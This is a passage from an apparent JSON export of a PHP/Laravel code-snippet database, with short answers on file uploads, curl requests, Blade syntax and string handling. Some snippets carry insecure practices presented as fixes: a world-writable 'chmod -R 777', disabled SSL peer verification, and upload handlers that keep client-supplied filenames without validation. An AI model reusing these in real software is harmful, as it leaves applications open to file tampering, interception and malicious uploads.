<!-- Bootstrap CSS File  -->     <link rel=\"stylesheet\" type=\"text/css\" href=\"bootstrap/css/bootstrap.min.css\"/> </head> <body> <div class=\"container\">     <!--  Header  -->     <div class=\"row\">         <div class=\"col-md-12\">             <h2>Export Data from MySQL to CSV</h2>         </div>     </div>     <!--  /Header  -->       <!--  Content   -->     <div class=\"form-group\">         <?php echo $users ?>     </div>     <div class=\"form-group\">         <button onclick=\"Export()\" class=\"btn btn-primary\">Export to CSV File</button>     </div>     <!--  /Content   -->       <script>         function Export()         {             var conf = confirm(\"Export users to CSV?\");             if(conf == true)             {                 window.open(\"export.php\", '_blank');             }         }     </script> </div> </body> </html>   \n<?php /* * iTech Empires:  Export Data from MySQL to CSV Script * Version: 1.0.0 * Page: DB Connection */   // Connection variables $host = \"localhost\"; // MySQL host name eg. localhost $user = \"root\"; // MySQL user. eg. root ( if your on localserver) $password = \"\"; // MySQL user password  (if password is not set for your root user then keep it empty ) $database = \"test\"; // MySQL Database name   // Connect to MySQL Database $con = new mysqli($host, $user, $password, $database);   // Check connection if ($con->connect_error) {     die(\"Connection failed: \" . $con->connect_error); } ?> \n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1106,
    "keyword": null,
    "link": null,
    "title": " ext-dom * -> it is missing from your system",
    "description": "sudo apt-get install php-xml \n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1107,
    "keyword": null,
    "link": null,
    "title": " extend laravel blade",
    "description": "//Including Sub-Views @include('view.name')  //Including Sub-Views with pass an array of data to view @include('view.name', ['some' => 'data'])\n@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\n@php     // @endphp\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1108,
    "keyword": null,
    "link": null,
    "title": " extend woocommerce user fields edit-account",
    "description": "// Add the custom field \"favorite_color\" add_action( 'woocommerce_edit_account_form', 'add_favorite_color_to_edit_account_form' ); function add_favorite_color_to_edit_account_form() {     $user = wp_get_current_user();     ?>         <p class=\"woocommerce-form-row woocommerce-form-row--wide form-row form-row-wide\">         <label for=\"favorite_color\"><?php _e( 'Favorite color', 'woocommerce' ); ?></label>         <input type=\"text\" class=\"woocommerce-Input woocommerce-Input--text input-text\" name=\"favorite_color\" id=\"favorite_color\" value=\"<?php echo esc_attr( $user->favorite_color ); ?>\" />     </p>     <?php }  // Save the custom field 'favorite_color'  add_action( 'woocommerce_save_account_details', 'save_favorite_color_account_details', 12, 1 ); function save_favorite_color_account_details( $user_id ) {     // For Favorite color     if( isset( $_POST['favorite_color'] ) )         update_user_meta( $user_id, 'favorite_color', sanitize_text_field( $_POST['favorite_color'] ) );      // For Billing email (added related to your comment)     if( isset( $_POST['account_email'] ) )         update_user_meta( $user_id, 'billing_email', sanitize_text_field( $_POST['account_email'] ) ); } \n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1109,
    "keyword": null,
    "link": null,
    "title": " extract($user input); alternative php",
    "description": "$info = array('Doina', 'brown', 'long');  // Listing all the variables list($she, $color, $hear) = $info; echo \"$she has $color eyes color and $hear black hair.\\n\";\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1110,
    "keyword": null,
    "link": null,
    "title": " extract all arrays from sql response in php",
    "description": "$response = mysqli_query($db_connection, $querry); foreach($response as $result){   print_r($result); }\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1111,
    "keyword": null,
    "link": null,
    "title": " factorial function php",
    "description": "function Factorial($n) {   \treturn ($n <= 1) ? 1 : $n * Factorial($n - 1); }\nfunction Factorial($number){      if($number <= 1){            return 1;        }        else{            return $number * Factorial($number - 1);        }    }     $number = 5;  $fact = Factorial($number);  echo \"Factorial = $fact\";  //output : 120 ?> \n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1112,
    "keyword": null,
    "link": null,
    "title": " factory laravel tinker",
    "description": "php artisan tinker    User::factory()->count(5)->create()\nphp artisan tinkerProduct::factory()->count(500)->create()\n$users = User::factory()->count(3)->make();\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1113,
    "keyword": null,
    "link": null,
    "title": " failed to clear cache. make sure you have the appropriate permissions. laravel",
    "description": "php artisan config:cache  \nalias larclear='php artisan cache:clear && php artisan config:cache && php artisan permission:cache-reset && php artisan config:clear && php artisan view:clear && php artisan route:clear && php artisan telescope:clear && php artisan debugbar:clear' \n#Just only add folder named data in storage/framework/cache/ and try php artisan cache:clear\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1114,
    "keyword": null,
    "link": null,
    "title": " failed to open stream: no such file or directory php",
    "description": "The error is due to missing vendor folder. You just need to run `composer install` in the project directory which will  create a folder named vendor which will have all composer libraries and  `autoload.php` file. \nThere are many reasons why one might run into this error and thus a good checklist of what to check first helps considerably.  Let's consider that we are troubleshooting the following line:  require \"/path/to/file\"\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1115,
    "keyword": null,
    "link": null,
    "title": " failed to open stream permission denied laravel",
    "description": "chmod -R 777 storage/\n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1116,
    "keyword": null,
    "link": null,
    "title": " fecade Artisan:call laravel",
    "description": "//     user \\ before Artisan \\Artisan::call('make:sub', [      'type' => 'origin', 'name' => $name ]); \n",
    "reg_date": "2021-10-12T10:13:52.000Z"
  },
  {
    "id": 1117,
    "keyword": null,
    "link": null,
    "title": " fetch data based on month and year in laravel",
    "description": "$date = Carbon::createFromFormat('d/m/Y', $request->salary_date);  $empsalaries = EmpSalary:: whereMonth('salary_date', $date->month)     ->whereYear('salary_date', $date->year)     ->get()  \n$post = Mjblog::whereYear('created_at', '=', $year)               ->whereMonth('created_at', '=', $month)               ->get(); \n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1118,
    "keyword": null,
    "link": null,
    "title": " fetch data from live website curl php",
    "description": "// Initialize Curl   $curl = curl_init();  curl_setopt($curl, CURLOPT_URL, \"https://coinmarketcap.com/\"); // set live website where data from  curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); // default  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); // default  $content = curl_exec($curl);   preg_match_all('!<p color=\"text3\" class=\"sc-AxhUy bzeXdk coin-item-symbol\" font-size=\"1\">(.*?)</p>!', $content, $matches);   var_dump($matches);\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1119,
    "keyword": null,
    "link": null,
    "title": " fetch method and class in codeigniter",
    "description": "$this->router->fetch_class(); $this->router->fetch_method();\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1120,
    "keyword": null,
    "link": null,
    "title": " fetch row in php",
    "description": "$sql = \"SELECT Lastname, Age FROM Persons ORDER BY Lastname\"; $result = $mysqli -> query($sql); while ($row = $result -> fetch_row()) {     //statements   }\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1121,
    "keyword": null,
    "link": null,
    "title": " fetch value from json link in php",
    "description": "$ch = curl_init(); // IMPORTANT: the below line is a security risk, read https://paragonie.com/blog/2017/10/certainty-automated-cacert-pem-management-for-php-software // in most cases, you should set it to true curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL, 'url_here'); $result = curl_exec($ch); curl_close($ch);  $obj = json_decode($result); echo $obj->access_token;\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1122,
    "keyword": null,
    "link": null,
    "title": " field doesn't have default value laravel",
    "description": "//put that field in  protected $fillable = ['field_name']\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1123,
    "keyword": null,
    "link": null,
    "title": " field not required validation laravel",
    "description": "$this->validate($request, [ \t\"field_nullable\" => \"nullable\" ]\n9  If it has worked for you before then you should check if you have messages defined in the app\\lang\\en\\validation.php or by chance you have changed the locale of the app and have not defined the messages for it. There are many possibilities.\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1124,
    "keyword": null,
    "link": null,
    "title": " file could not be downloaded: Unable to find the wrap per \"https\" - did you forget to enable it when you configured PHP? failed to open stream: No such file or directory",
    "description": "solved it in XAMPP by uncommenting ;extension=php_openssl.dll in  /apache/bin/php.ini despite  phpinfo() telling me /php/php.ini  was the loaded ini file.    And You just uncomment the extension_dir in php.ini  \n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1125,
    "keyword": null,
    "link": null,
    "title": " file form validation codeigniter",
    "description": "if (empty($_FILES['userfile']['name'])) {     $this->form_validation->set_rules('userfile', 'Image', 'required'); }\n<?php  class Form extends CI_Controller {          public function index()         {                 $this->load->helper(array('form', 'url'));                  $this->load->library('form_validation');                  if ($this->form_validation->run() == FALSE)                 {                         $this->load->view('myform');                 }                 else                 {                         $this->load->view('formsuccess');                 }         } } \n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1126,
    "keyword": null,
    "link": null,
    "title": " file get contents timeout",
    "description": "$ctx = stream_context_create(array('http'=>     array(         'timeout' => 1200,  //1200 Seconds is 20 Minutes     ) ));  echo file_get_contents('http://example.com/', false, $ctx);\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1127,
    "keyword": null,
    "link": null,
    "title": " file original extensions laravel",
    "description": "$extension = $file->getClientOriginalExtension();\n",
    "reg_date": "2021-10-12T10:13:53.000Z"
  },
  {
    "id": 1128,
    "keyword": null,
    "link": null,
    "title": " file put contents alternative php",
    "description": "<?php // this is an alternative for file_get_contents // using Curl >  function url_get_contents ($Url) {     if (!function_exists('curl_init')){          die('CURL is not installed!');     }     $ch = curl_init();     curl_setopt($ch, CURLOPT_URL, $Url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);     $output = curl_exec($ch);     curl_close($ch);     return json_decode($output,JSON_OBJECT_AS_ARRAY); }  ?>\n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1129,
    "keyword": null,
    "link": null,
    "title": " file put contents php json file",
    "description": "$data[] = $_POST['data'];  $inp = file_get_contents('results.json'); $tempArray = json_decode($inp); array_push($tempArray, $data); $jsonData = json_encode($tempArray); file_put_contents('results.json', $jsonData);\n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1130,
    "keyword": null,
    "link": null,
    "title": " file to binary php",
    "description": "$data = fopen ($image, 'rb'); $size=filesize ($image); $contents= fread ($data, $size); fclose ($data); \n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1131,
    "keyword": null,
    "link": null,
    "title": " file upload in php through ajax",
    "description": "**1. index.php** <body>     <span id=\"msg\" style=\"color:red\"></span><br/>     <input type=\"file\" id=\"photo\"><br/>   <script type=\"text/javascript\" src=\"jquery-3.2.1.min.js\"></script>   <script type=\"text/javascript\">     $(document).ready(function(){       $(document).on('change','#photo',function(){         var property = document.getElementById('photo').files[0];         var image_name = property.name;         var image_extension = image_name.split('.').pop().toLowerCase();          if(jQuery.inArray(image_extension,['gif','jpg','jpeg','']) == -1){           alert(\"Invalid image file\");         }          var form_data = new FormData();         form_data.append(\"file\",property);         $.ajax({           url:'upload.php',           method:'POST',           data:form_data,           contentType:false,           cache:false,           processData:false,           beforeSend:function(){             $('#msg').html('Loading......');           },           success:function(data){             console.log(data);             $('#msg').html(data);           }         });       });     });   </script> </body>  **2.upload.php** <?php if($_FILES['file']['name'] != ''){     $test = explode('.', $_FILES['file']['name']);     $extension = end($test);         $name = rand(100,999).'.'.$extension;      $location = 'uploads/'.$name;     move_uploaded_file($_FILES['file']['tmp_name'], $location);      echo '<img src=\"'.$location.'\" height=\"100\" width=\"100\" />'; } \n$('#upload').on('click', function() {     var file_data = $('#sortpicture').prop('files')[0];        var form_data = new FormData();                       form_data.append('file', file_data);     alert(form_data);                                  $.ajax({         url: 'upload.php', // point to server-side PHP script          dataType: 'text',  // what to expect back from the PHP script, if anything         cache: false,         contentType: false,         processData: false,         data: form_data,                                  type: 'post',         success: function(php_script_response){             alert(php_script_response); // display response from the PHP script, if any         }      }); }); \nvar formData = new FormData($(\"#YOUR_FORM_ID\")[0]); $.ajax({     url: \"upload.php\",     type: \"POST\",     data : formData,     processData: false,     contentType: false,     beforeSend: function() {      },     success: function(data){         },     error: function(xhr, ajaxOptions, thrownError) {        console.log(thrownError + \"\\r\\n\" + xhr.statusText + \"\\r\\n\" + xhr.responseText);     } }); \nasync function saveFile()  {     let formData = new FormData();                formData.append(\"file\", sortpicture.files[0]);     await fetch('/uploads', {method: \"POST\", body: formData});         alert('works'); }\n<?php      if ( 0 < $_FILES['file']['error'] ) {         echo 'Error: ' . $_FILES['file']['error'] . '<br>';     }     else {         move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);     }  ?> \n<? $data = array();     //check with your logic     if (isset($_FILES)) {         $error = false;         $files = array();          $uploaddir = $target_dir;         foreach ($_FILES as $file) {             if (move_uploaded_file($file['tmp_name'], $uploaddir . basename( $file['name']))) {                 $files[] = $uploaddir . $file['name'];             } else {                 $error = true;             }         }         $data = ($error) ? array('error' => 'There was an error uploading your files') : array('files' => $files);     } else {         $data = array('success' => 'NO FILES ARE SENT','formData' => $_REQUEST);     }      echo json_encode($data); ?> \nmove_uploaded_file(      // this is where the file is temporarily stored on the server when uploaded     // do not change this     $_FILES['file']['tmp_name'],      // this is where you want to put the file and what you want to name it     // in this case we are putting in a directory called \"uploads\"     // and giving it the original filename     'uploads/' . $_FILES['file']['name'] ); \n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1132,
    "keyword": null,
    "link": null,
    "title": " filemtime($current file name);",
    "description": " <?php // outputs e.g.  somefile.txt was last modified: December 29 2002 22:16:23.  $filename = 'somefile.txt'; if (file_exists($filename)) {     echo \"$filename was last modified: \" . date (\"F d Y H:i:s.\", filemtime($filename)); } ?>  \n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1133,
    "keyword": null,
    "link": null,
    "title": " filename php",
    "description": "echo \"1) \".basename(\"/etc/sudoers.d\", \".d\").PHP_EOL;//sudoers echo \"2) \".basename(\"/etc/sudoers.d\").PHP_EOL;//sudoers.d echo \"3) \".basename(\"/etc/passwd\").PHP_EOL;//passwd echo \"4) \".basename(\"/etc/\").PHP_EOL;//etc echo \"5) \".basename(\".\").PHP_EOL;//. echo \"6) \".basename(\"/\");//\n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1134,
    "keyword": null,
    "link": null,
    "title": " filesize in php",
    "description": "$file = '/path/to/your/file'; $filesize = filesize($file); // bytes $filesize = round($filesize / 1024 / 1024, 1); // megabytes with 1 digit   echo \"The size of your file is $filesize MB.\"; \n$fileSizeInBytes=filesize(\"/path/to/myfile.txt\"); \n$file = '/path/to/your/file'; $filesize = filesize($file); // bytes $filesize = round($filesize / 1024, 2); // kilobytes with two digits   echo \"The size of your file is $filesize KB.\"; \n$file = '/path/to/your/file'; $filesize = filesize($file);   echo \"The size of your file is $filesize bytes.\"; \n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1135,
    "keyword": null,
    "link": null,
    "title": " fillable vs guarded laravel",
    "description": "Mass assignment is a process of sending an array of data that will be saved to the specified model at once. In general, you don&rsquo;t need to save data on your model on one by one basis, but rather in a single process.   In Laravel, fillable attributes are used to specify those fields which are to be mass assigned. Guarded attributes are used to specify those fields which are not mass assignable.\nprotected $guarded = ['name', 'email']; \n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1136,
    "keyword": null,
    "link": null,
    "title": " find and replace phpstorm",
    "description": "Press Ctrl+R \n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1137,
    "keyword": null,
    "link": null,
    "title": " find curren monday in laravel carbon",
    "description": "$now = Carbon::now(); $weekStartDate = $now->startOfWeek()->format('Y-m-d H:i'); $weekEndDate = $now->endOfWeek()->format('Y-m-d H:i');\n",
    "reg_date": "2021-10-12T10:13:54.000Z"
  },
  {
    "id": 1138,
    "keyword": null,
    "link": null,
    "title": " find days with name between two dates in php",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$startDate = new DateTime(\"2019-10-27\"); $endDate = new DateTime(\"2020-04-11\");  $difference = $endDate->diff($startDate); echo $difference->format(\"%a\");\n$from_date ='01-01-2013'; $to_date ='05-01-2013';  $from_date = new DateTime($from_date); $to_date = new DateTime($to_date);  for ($date = $from_date; $date <= $to_date; $date->modify('+1 day')) {   echo $date->format('l') . \"\\n\"; }\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1139,
    "keyword": null,
    "link": null,
    "title": " find element in arrat php",
    "description": "array_search ( mixed $needle , array $haystack , bool $strict = false ) : int|string|false  <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>\n$userdb=Array (     (0) => Array         (             (uid) => '100',             (name) => 'Sandra Shush',             (url) => 'urlof100'         ),      (1) => Array         (             (uid) => '5465',             (name) => 'Stefanie Mcmohn',             (pic_square) => 'urlof100'         ),      (2) => Array         (             (uid) => '40489',             (name) => 'Michael',             (pic_square) => 'urlof40489'         ) );  simply u can use this  $key = array_search(40489, array_column($userdb, 'uid'));\n$array = [     'clothes' => 't-shirt',     'size'    => 'medium',     'color'   => 'blue', ];   extract($array);   echo(\"$clothes $size $color\"); // t-shirt medium blue \n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1140,
    "keyword": null,
    "link": null,
    "title": " find in php string or",
    "description": "$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n//Find the position of the first occurrence of a substring in a string $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n$pos = strpos(\"find the position of X in here\", \"X\");\n <?php // We can search for the character, ignoring anything before the offset $newstring = 'abcdef abcdef'; $pos = strpos($newstring, 'a', 1); // $pos = 7, not 0 ?>  \n<?php function g($string,$start,$end){      preg_match_all('/' . preg_quote($start, '/') . '(.*?)'. preg_quote($end, '/').'/i', $string, $m);      $out = array();       foreach($m[1] as $key => $value){        $type = explode('::',$value);        if(sizeof($type)>1){           if(!is_array($out[$type[0]]))              $out[$type[0]] = array();           $out[$type[0]][] = $type[1];        } else {           $out[] = $value;        }      }   return $out; } print_r(g('Sample text, [/text to extract/] Rest of sample text [/WEB::http://google.com/] bla bla bla. ','[/','/]')); ?>  results: Array (     [0] => text to extract     [WEB] => Array         (             [0] => http://google.com         )  )  Can be helpfull to custom parsing :)   \n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1141,
    "keyword": null,
    "link": null,
    "title": " find index of a character in a string php",
    "description": "<?php echo strpos(\"I love php, I love php too!\",\"php\"); ?> \n <?php // Get the first character of a string $str = 'This is a test.'; $first = $str[0];  // Get the third character of a string $third = $str[2];  // Get the last character of a string. $str = 'This is still a test.'; $last = $str[strlen($str)-1];  // Modify the last character of a string $str = 'Look at the sea'; $str[strlen($str)-1] = 'e';  ?>  \n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1142,
    "keyword": null,
    "link": null,
    "title": " find string in text in laravel",
    "description": "@if (str_contains($mystring, 'SIZE')) \nuse Illuminate\\Support\\Str;   $myString = 'This is from itsolutionstuff.com website.';   $contains = Str::contains($myString, 'itsolutionstuff.com');     // true\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1143,
    "keyword": null,
    "link": null,
    "title": " find substring regx php",
    "description": "if (preg_match(\"/\\bweb\\b/i\", \"PHP is the web scripting language of choice.\")) {     echo \"A match was found.\"; } else {     echo \"A match was not found.\"; }\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1144,
    "keyword": null,
    "link": null,
    "title": " find type in php",
    "description": "gettype($u)\ngettype ( mixed $var ) : string \n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1145,
    "keyword": null,
    "link": null,
    "title": " find which php.ini is used",
    "description": "php -i | grep \"Loaded Configuration File\" \nfor cmd : php --ini    for code : use php_ini_loaded_file() as :=  $inipath = php_ini_loaded_file(); if ($inipath) {     echo 'Loaded php.ini: ' . $inipath; } else {     echo 'A php.ini file is not loaded'; }\nphp --ini \nrun: php --ini\n1. Create test.php file with the following content  2. <?php phpinfo(); ?>  3. Put it in the root of the site (or in a public folder)  4. Open the file on your browser \"domaine.com/test.php\"  4. Look for \"Loaded Configuration File\"\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1146,
    "keyword": null,
    "link": null,
    "title": " find word in text in laravel",
    "description": "$string = 'Cassandra is a clean word so it should pass the check'; $blacklistArray = ['ass','ball sack'];  $contains = str_contains($string, $blacklistArray);\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1147,
    "keyword": null,
    "link": null,
    "title": " findorfail laravel",
    "description": "$flight = Flight::findOrFail(1);  $flight = Flight::where('legs', '>', 3)->firstOrFail();\n$model = App\\Flight::where('name', 'Mike')->firstOrFail();\n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1148,
    "keyword": null,
    "link": null,
    "title": " firebase jwt php verify",
    "description": "try {    $usertoken_to_verify = $_GET[\"usertoken\"];    $decodejwt = JWT::decode($usertoken_to_verify, $key, array('HS256')); print_r($decodejwt);  } catch (\\Exception $e) {   echo $e;  }\n",
    "reg_date": "2021-10-12T10:13:55.000Z"
  },
  {
    "id": 1149,
    "keyword": null,
    "link": null,
    "title": " first character uppercase php",
    "description": " <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?>  \n <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \nucwords(\"hello world\"); // Hello World ucfirst(\"hello world\"); // Hello world\n$clientname = \"ankur prajapati\"; ucwords($clientname);//Ankur Prajapati ucfirst($clientname);//Ankur Prajapati  $clientname = \"ANKUR PRAJAPATI\"; ucfirst(strtolower($clientname));//Ankur Prajapati\nucfirst($myword);\n <?php echo ucfirst(\"hello world!\"); ?>  \n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1150,
    "keyword": null,
    "link": null,
    "title": " first day of month php",
    "description": "$first_day = date('Y-m-01');   $last_day = date('Y-m-t');\n<?php     // First day of this month     $d = new DateTime('first day of this month');     echo $d->format('jS, F Y'); ?>\n//get first day of the current month  $start = date(\"Y-m-1 00:00:00\"); //get current date of the month $end = date(\"Y-m-d H:i:s\");  //query data for the current month so far $query = $this->db_model->run_query(\"select column_1, column_2 from table where date_column BETWEEN '\".$start.\"' AND '\".$end.\"'\");\n$config_month  = 1; $config_day = 1;  $new_expiry_date = date('Y-m-d', mktime(0, 0, 0, date('m') + $config_month, 1 + $config_day, date('Y')));                 \n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1151,
    "keyword": null,
    "link": null,
    "title": " first item in array php",
    "description": "array_values($array)[0]; \n$firstItem = array_shift($array);\n$colors = array(2=>\"blue\",3 =>\"green\",1=>\"red\"); $firstValue = reset($colors); //blue $firstKey = key($colors); //2\n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //Remove \"orange\" from array and return it print_r($stack); /** OUTPUT: Array (     [0] => banana     [1] => apple     [2] => raspberry ) */ ?>\n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1152,
    "keyword": null,
    "link": null,
    "title": " first letter capital of every word in php",
    "description": " <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?>  \n$foo = 'hello world!'; $foo = ucwords($foo);             // Hello World!  $bar = 'HELLO WORLD!'; $bar = ucwords($bar);             // HELLO WORLD! $bar = ucwords(strtolower($bar)); // Hello World!  //With custom delimiter $foo = 'hello|world!'; $bar = ucwords($foo);             // Hello|world!  $baz = ucwords($foo, \"|\"); \n$upperCaseSentance=ucwords(\"i do not feel good\");//I Do Not Feel Good\n$clientname = \"ankur prajapati\"; ucwords($clientname);//Ankur Prajapati ucfirst($clientname);//Ankur Prajapati  $clientname = \"ANKUR PRAJAPATI\"; ucfirst(strtolower($clientname));//Ankur Prajapati\nucfirst($myword);\nucfirst(\"hello world!\");\n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1153,
    "keyword": null,
    "link": null,
    "title": " first name of string php",
    "description": "$firstStringCharacter = substr(\"hello\", 0, 1);\n$words = explode(\" \", $string);  $firstname = $words[0]; $lastname = $words[1]; $third_word = $words[2];\n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1154,
    "keyword": null,
    "link": null,
    "title": " firstwhere laravel",
    "description": "Role::firstWhere('name', 'admin') Role::firstWhere(['name' => 'admin', 'display_name' => 'Administrateur'])\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1155,
    "keyword": null,
    "link": null,
    "title": " fix excel file wrong language php",
    "description": "Add below row to header export excel/csv file  fputs($fp, &ldquo;\\xEF\\xBB\\xBF&rdquo;);    \n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1156,
    "keyword": null,
    "link": null,
    "title": " fix to 2 decimal places php",
    "description": "return number_format((float)$number, 2, '.', ''); \n$num = 5; $num = number_format($num, 2);\n$foo = \"105\"; echo number_format((float)$foo, 2, '.', '');\necho round(520.34345, 2);   // 520.34 echo round(520.3, 2);       // 520.3 echo round(520, 2);         // 520 \n// using round() function we can roundoff float values in php $value = 58.24365; round($value, 2); //result 58.24\nround(520.34345, 2);   // 520.34\n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1157,
    "keyword": null,
    "link": null,
    "title": " fixuphost",
    "description": "<?php echo sohail?>\n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1158,
    "keyword": null,
    "link": null,
    "title": " floor ceil php",
